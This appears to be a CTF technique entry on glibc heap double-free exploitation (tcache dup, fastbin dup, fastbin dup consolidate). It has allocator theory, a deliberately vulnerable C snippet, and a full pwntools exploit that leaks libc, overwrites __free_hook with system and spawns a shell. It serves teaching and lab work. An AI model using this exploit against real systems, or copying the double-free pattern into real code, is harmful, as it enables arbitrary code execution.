---
title: "Double Free - tcache dup, fastbin dup and fastbin dup consolidate"
category: pwn
subcategory: heap
type: technique
tags: [double-free, tcache, fastbin, uaf, heap, tcache-dup, fastbin-dup, fasttop, malloc-consolidate, tcache-key, free-hook, pwndbg, gef, pwntools, one-gadget, glibc]
difficulty: medium
summary: "Free the same chunk twice so one address appears twice in a bin; the second malloc hands you a live chunk you can still edit."
when_to_use:
  - "The free path does not NULL the pointer, so you can call free on the same index twice"
  - "You have no edit() primitive and therefore cannot poison a tcache fd directly"
  - "glibc < 2.29 (no tcache key), or you can clear the key byte"
  - "You need two pointers to the same memory: one 'live', one still in the bin"
tools: [pwntools, pwndbg, gef, one-gadget]
related: [heap-use-after-free, heap-tcache-poisoning, heap-tcache-key-bypass, house-botcake, heap-fake-chunk]
---

## TL;DR

Calling `free()` twice on the same pointer puts one address in a free list twice.
Allocate it once and you own a chunk that the allocator still believes is free, so
writing to it overwrites the `next`/`fd` pointer of a *queued* entry. Three flavours:
tcache dup (2.26-2.28, trivial), fastbin dup (all versions, needs an A-B-A dance),
and fastbin dup consolidate (gets the same chunk into two different bins).

## Recognise it

- `free(ptr[i])` with no `ptr[i] = NULL` *and* no separate in-use flag.
- The program frees on one code path and again on an error/cleanup path.
- `realloc(p, 0)` is used - that is a `free`, and the caller often still holds `p`.
- A C++ container destructor runs twice (moved-from object still owning a pointer).
- You have `free` and `alloc` but **no** `edit` - double free is how you get the write.

## Vulnerable code shape

```c
static char *ptr[16];

void do_free(void) {
    int i = read_idx();
    if (i < 0 || i >= 16) return;
    free(ptr[i]);          /* BUG: no ptr[i] = NULL, no in_use[i] = 0 */
}

/* The realloc(p, 0) flavour: */
void do_resize(void) {
    int i = read_idx();
    size_t n = read_size();
    ptr[i] = realloc(ptr[i], n);   /* n == 0 -> free(ptr[i]) and returns NULL,
                                      but many challenges ignore the NULL return
                                      and keep the old pointer in a local. */
}
```

## Theory

### tcache dup - glibc 2.26 to 2.28

`tcache_put` in these versions is:

```c
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
```

There is **no check of any kind**. `free(A); free(A);` gives
`entries[i] = A -> A -> ...` (A's `next` points at A itself, count = 2).
Two mallocs return A twice; the first one lets you write A's `next` and thus set
`entries[i]` to anything.

### tcache key - glibc 2.29+

2.29 added, in `_int_free`:

```c
if (__glibc_unlikely (e->key == tcache_key))
  {
    tcache_entry *tmp;
    for (tmp = tcache->entries[tc_idx]; tmp; tmp = tmp->next)
      if (tmp == e)
        malloc_printerr ("free(): double free detected in tcache 2");
  }
```

Note the shape: it only *scans* when the key matches, and it only scans the bin for
that index. Bypasses are in `heap-tcache-key-bypass`; the short version is
"clear 8 bytes at chunk+0x8 with any write primitive", or "use fastbins instead".

### fastbin dup - all versions

`_int_free`'s fastbin path checks only the *head* of the list:

```c
if (__builtin_expect (old == p, 0))
  malloc_printerr ("double free or corruption (fasttop)");
```

So `free(A); free(A);` aborts, but `free(A); free(B); free(A);` does not - when the
second `free(A)` runs, the head is `B`, not `A`. Result:
`fastbin[i] = A -> B -> A -> B -> ...` (A's `fd` still points at B).

Then:

1. `malloc()` -> A. The head becomes B.
2. `malloc()` -> B. The head becomes A (from A's stale `fd`).
3. You still hold A (live). Write `fd = target` into it.
4. `malloc()` -> A again. Head becomes `target`.
5. `malloc()` -> `target`.

`_int_malloc`'s fastbin path also checks the *size field of the returned chunk*:

```c
if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
  malloc_printerr ("malloc(): memory corruption (fast)");
```

So the fake chunk at `target` must have a `size` field matching the bin. That is where
the classic `__malloc_hook - 0x23` trick comes from: the bytes there read `0x7f` which
gives size `0x7f` -> fastbin index for a 0x70 chunk. See `heap-fake-chunk`.

To reach fastbins at all on 2.26+ you must first fill that size's tcache with 7 chunks.

### fastbin dup consolidate

Get the same chunk into a fastbin **and** the unsorted bin at once:

1. `free(A)` with A a fastbin size - A is in `fastbin[i]`.
2. `malloc(0x1000)` (or any request that forces `_int_malloc` into the
   large/unsorted path) triggers `malloc_consolidate()`, which drains all fastbins into
   the unsorted bin. A is now in unsorted, but `fastbin[i]` head was reset to NULL.
3. `free(A)` again - the fasttop check compares against NULL, so it passes. A is now
   in `fastbin[i]` **and** in the unsorted bin.
4. `malloc(fast_size)` returns A from the fastbin while the unsorted bin still lists it:
   you now have a live chunk that malloc will hand out a second time, and whose `bk`
   you can point anywhere for an unsorted bin attack.

Targets: works cleanly on 2.23-2.28; on 2.29+ the unsorted-bin `bck->fd != victim`
check makes step 4's follow-up harder but the overlap itself still occurs.

## Attack

Concrete tcache-dup chain on glibc 2.27 (no key):

1. `alloc(0, 0x68)` -> A
2. `free(0)`
3. `free(0)` - tcache[0x70] = A -> A, count = 2
4. `alloc(1, 0x68, p64(__free_hook))` - returns A, writes A->next = `__free_hook`
   (tcache[0x70] = A -> `__free_hook`)
5. `alloc(2, 0x68)` - returns A again (the duplicate)
6. `alloc(3, 0x68, p64(system))` - returns `__free_hook`, writes `system`
7. `alloc(4, 0x18, b"/bin/sh\x00")`, `free(4)` -> shell

Concrete fastbin-dup chain on glibc 2.31 (key present, so use fastbins):

1. `alloc(0..6, 0x68)` - seven chunks, then `free` all seven to fill tcache[0x70].
2. `alloc(7, 0x68)` -> A, `alloc(8, 0x68)` -> B
3. `free(7)` - tcache is full (7/7), so A goes to `fastbin[5]`
4. `free(8)` - B goes to `fastbin[5]`, head = B
5. `free(7)` - head is B != A, fasttop passes. `fastbin[5] = A -> B -> A`
6. Now `malloc(0x68)` seven times drains tcache; the 8th, 9th, 10th give A, B, A.
   Easier: allocate one chunk to move a fastbin entry into tcache
   (`_int_malloc` refills tcache from the fastbin), which re-links A twice into tcache.
7. Poison and finish exactly like the tcache case.

## Heap state

```text
tcache dup on 2.27 (steps 2-3)

  entries[5] --> A
  A: +0x00 | next = A |    <-- A points at itself
     +0x08 | (no key in 2.27)
  counts[5] = 2

after step 4 (malloc returned A, we wrote next = __free_hook)

  entries[5] --> A
  A: +0x00 | next = __free_hook |
  counts[5] = 1
  malloc#2 -> A            ; entries[5] = __free_hook, counts[5] = 0
  malloc#3 -> __free_hook  ; counts[5] = -1 (unsigned wrap, harmless pre-2.34)


fastbin dup A-B-A (step 5)

  fastbin[5] head --> A --> B --> A --> B ... (cycle)
  A: +0x00 | fd = B |
  B: +0x00 | fd = A |

  malloc -> A   head = B
  malloc -> B   head = A
  write A->fd = fake       (A is live and still linked)
  malloc -> A   head = fake
  malloc -> fake           (needs fake->size to pass fastbin_index check)
```

## Exploit

```python
#!/usr/bin/env python3
"""Double free -> tcache dup (2.26-2.28) with an automatic fastbin-dup fallback
for 2.29+ where the tcache key blocks the simple version.

Target: glibc 2.26 - 2.31.
Usage:
    ./exploit.py
    ./exploit.py FASTBIN            # force the fastbin-dup path
    ./exploit.py REMOTE HOST=1.2.3.4 PORT=1337
"""
from pwn import ELF, args, context, log, p64, process, remote, u64

BINARY = args.BIN or "./chal"
LIBC = args.LIBC or "./libc.so.6"

context.binary = elf = ELF(BINARY, checksec=False)
context.log_level = args.LOG or "info"
libc = ELF(LIBC, checksec=False)

FAST_SIZE = 0x68          # -> 0x70 chunk: tcache idx 5 and fastbin idx 5


def start():
    if args.REMOTE:
        return remote(args.HOST or "127.0.0.1", int(args.PORT or 1337))
    return process([BINARY])


io = start()


def menu(c):
    io.sendlineafter(b"> ", str(c).encode())


def alloc(idx, size, data=b"A"):
    menu(1)
    io.sendlineafter(b"index: ", str(idx).encode())
    io.sendlineafter(b"size: ", str(size).encode())
    io.sendafter(b"content: ", data)


def free(idx):
    menu(2)
    io.sendlineafter(b"index: ", str(idx).encode())


def show(idx):
    menu(3)
    io.sendlineafter(b"index: ", str(idx).encode())
    io.recvuntil(b"content: ")
    return io.recvline().rstrip(b"\n")


def leak_u64(raw):
    return u64(raw.ljust(8, b"\x00")[:8])


# ------------------------------------------------------------------ libc leak
alloc(15, 0x418, b"leaker")
alloc(14, 0x18, b"guard")
free(15)
arena = leak_u64(show(15))
libc.address = arena - 0x60 - libc.sym["main_arena"]
log.success("libc base = %#x", libc.address)

free_hook = libc.sym["__free_hook"]
system = libc.sym["system"]


def tcache_dup():
    """glibc 2.26 - 2.28: no key, free the same chunk twice, done."""
    alloc(0, FAST_SIZE, b"A" * 8)
    free(0)
    free(0)                                   # entries[5] = A -> A
    alloc(1, FAST_SIZE, p64(free_hook))       # returns A, sets A->next
    alloc(2, FAST_SIZE, b"pad")               # returns A again
    alloc(3, FAST_SIZE, p64(system))          # returns __free_hook


def fastbin_dup():
    """glibc 2.29 - 2.31: fill tcache so frees land in the fastbin, then A-B-A."""
    for i in range(7):                        # 7 chunks to saturate tcache[5]
        alloc(i, FAST_SIZE, b"filler")
    for i in range(7):
        free(i)                               # tcache[5] now full (7/7)

    alloc(7, FAST_SIZE, b"A" * 8)             # A
    alloc(8, FAST_SIZE, b"B" * 8)             # B
    free(7)                                   # fastbin[5]: A
    free(8)                                   # fastbin[5]: B -> A
    free(7)                                   # head is B, fasttop passes: A -> B -> A

    # Drain tcache so the next mallocs come from the fastbin. _int_malloc also
    # refills tcache from the fastbin, which relinks A into tcache twice.
    for i in range(7):
        alloc(i, FAST_SIZE, b"drain")

    alloc(9, FAST_SIZE, p64(free_hook))       # returns A, writes A->fd/next
    alloc(10, FAST_SIZE, b"pad")
    alloc(11, FAST_SIZE, b"pad")
    alloc(12, FAST_SIZE, p64(system))         # lands on __free_hook


if args.FASTBIN:
    fastbin_dup()
else:
    tcache_dup()

log.success("__free_hook = system")

alloc(13, 0x18, b"/bin/sh\x00")
free(13)
io.interactive()
```

## Variants & pitfalls

- **`free(): double free detected in tcache 2`** means the key check fired. Either the
  chunk is genuinely already in that tcache bin, or you need `heap-tcache-key-bypass`.
- **`double free or corruption (fasttop)`** means you freed the current fastbin head.
  Interleave a different chunk (A-B-A).
- **`malloc(): memory corruption (fast)`** means your fake chunk's size field does not
  match the fastbin index. Check `fastbin_index(size) == idx` and that `size` has the
  right alignment/flags.
- **`free(): invalid next size (fast)`** fires when `fake_chunk + size` does not hold a
  plausible size (must satisfy `0x20 <= nextsize <= av->system_mem`, usually 0x21000).
- **Counts underflow.** On 2.26-2.33 `counts[i]` is a `uint16_t`; allocating from a
  poisoned bin can wrap it to 0xFFFF. Harmless there, but 2.34+ checks
  `tcache->counts[tc_idx] > 0` before `tcache_get`, so keep counts sane.
- **realloc(p, 0)** frees; realloc to a smaller size may return the *same* pointer, which
  breaks your bookkeeping. Read the decompiled realloc branch carefully.
- **Calloc** never pulls from tcache, so a tcache dup does not help if the program
  allocates with calloc - use the fastbin variant.

## Debugging

```text
pwndbg> bins                       # watch the cycle appear: A -> A or A -> B -> A
pwndbg> tcache                     # counts[] and entries[] after each free
pwndbg> try_free <A>               # prints exactly which check the next free hits
pwndbg> vis_heap_chunks 10
pwndbg> x/4gx <A_addr>             # next / key fields
pwndbg> p tcache_key               # 2.34+: the random key value
gef>  heap bins fast
gef>  heap-analysis-helper         # logs every malloc/free and flags double frees
```

## Tools

- `pwndbg try_free` - the single most useful command for this technique.
- `gef heap-analysis-helper` - automatic double-free / UAF detection while you fuzz the menu.
- `one_gadget`, `seccomp-tools`.

## References

- shellphish `how2heap`: `tcache_dup.c`, `fastbin_dup.c`, `fastbin_dup_consolidate.c`,
  `tcache_house_of_spirit.c`.
- glibc `malloc/malloc.c`: `_int_free` fastbin and tcache paths.
